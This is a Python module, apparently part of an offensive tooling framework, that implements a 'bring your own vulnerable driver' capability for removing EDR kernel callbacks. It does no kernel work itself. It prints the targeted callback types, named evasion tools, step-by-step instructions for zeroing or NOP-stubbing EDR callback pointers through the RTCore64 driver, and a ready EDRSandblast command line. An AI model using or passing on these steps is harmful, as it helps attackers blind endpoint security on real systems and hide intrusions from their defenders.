"""EDR callback removal via vulnerable driver — blind EDR kernel callbacks."""
from __future__ import annotations
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.byovd.callback_kill.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kernel_callback_remove", "edr_disable"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1562.001", "T1068"],
}

CALLBACK_TYPES = [
    "PsSetCreateProcessNotifyRoutine",
    "PsSetCreateThreadNotifyRoutine",
    "PsSetLoadImageNotifyRoutine",
    "CmRegisterCallback",
    "ObRegisterCallbacks",
    "MiniFilter (FltRegisterFilter)",
]


def run(args: Any) -> int:
    driver = getattr(args, "driver", "RTCore64")
    action = getattr(args, "callback_action", "list")
    target_edr = getattr(args, "target_edr", None)

    if action == "list":
        print("[*] Kernel callback types that EDRs register:")
        for cb in CALLBACK_TYPES:
            print("  - {}".format(cb))
        print("\n[*] Tools for callback enumeration:")
        print("  - EDRSandblast (enumerate + remove)")
        print("  - CheekyBlinder (RTCore64-based)")
        print("  - CallbackHell (multi-driver)")
        return 0

    if action == "enumerate":
        print("[*] Enumerating kernel callbacks via {} driver...".format(driver))
        print("[*] This requires:")
        print("  1. Load vulnerable driver")
        print("  2. Read PspCreateProcessNotifyRoutine array")
        print("  3. Resolve callback addresses to driver names")
        if target_edr:
            print("[*] Filtering for: {}".format(target_edr))
        return 0

    if action == "remove":
        print("[*] Removing EDR callbacks via {} driver:".format(driver))
        print("  1. Enumerate callback array addresses")
        print("  2. For each EDR callback:")
        print("     a. Read callback struct from kernel memory")
        print("     b. Zero out the callback function pointer")
        print("     c. Or replace with a NOP stub")
        print("  3. EDR loses visibility into process/thread/image events")
        if target_edr:
            print("\n[*] Targeting: {} callbacks only".format(target_edr))
        print("\n[!] EDRSandblast command:")
        print("  EDRSandblast.exe --usermode --kernelmode --driver {}".format(driver))
        return 0

    return 1
